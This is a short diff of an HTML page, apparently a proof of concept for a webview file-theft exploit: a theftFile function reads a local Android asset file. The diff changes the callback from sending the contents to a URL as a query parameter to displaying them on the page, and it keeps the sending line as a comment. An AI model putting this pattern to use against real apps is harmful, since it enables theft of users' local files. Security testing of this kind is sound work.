@@ -17,10 +17,18 @@
     var file = "/android_asset/ads/house_ad_icon_144x144.webp";
 
     theftFile(file, function(contents) {
-        location.href = "https://localhost/?data=" + encodeURIComponent(contents);
+      document.getElementById("add_to_me")
+                .innerHTML +=
+                `<h3>` +
+                contents +
+                `</h3>`;
+        //location.href = "https://localhost/?data=" + encodeURIComponent(contents);
     });
 </script>
 </head>
 <body>
+    <div id="add_to_me">
+        <h1>Testing</h1>
+    </div>
 </body>
 </html>
